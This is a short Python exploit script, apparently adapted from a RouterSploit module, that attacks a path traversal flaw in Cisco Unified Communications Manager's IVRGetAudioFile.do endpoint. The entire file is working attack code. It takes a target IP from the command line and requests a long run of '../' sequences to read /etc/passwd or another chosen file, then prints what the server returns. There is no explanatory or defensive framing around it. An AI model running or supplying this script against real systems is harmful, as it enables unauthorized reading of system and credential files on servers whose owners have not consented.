target = ""
# rsf exploit module
# description: Module exploits path traversal vulnerability in Cisco Unified Communications Manager allowing reading files from the filesystem.

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.filename = "/etc/passwd"

    def run(self):
        if self.check():
            path = f"http://{self.target}:{self.port}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../..{self.filename}"
            
            try:
                response = requests.get(path)
                if response and response.status_code == 200 and response.text:
                    print("[+] Exploit success")
                    print(response.text)
                else:
                    print("[-] Exploit failed")
            except Exception as e:
                print(f"[-] Error: {str(e)}")
        else:
            print("[-] Target not vulnerable")

    def check(self):
        path = f"http://{self.target}:{self.port}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd"
        
        try:
            response = requests.get(path)
            return response and response.status_code == 200 and "root:" in response.text
        except:
            return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
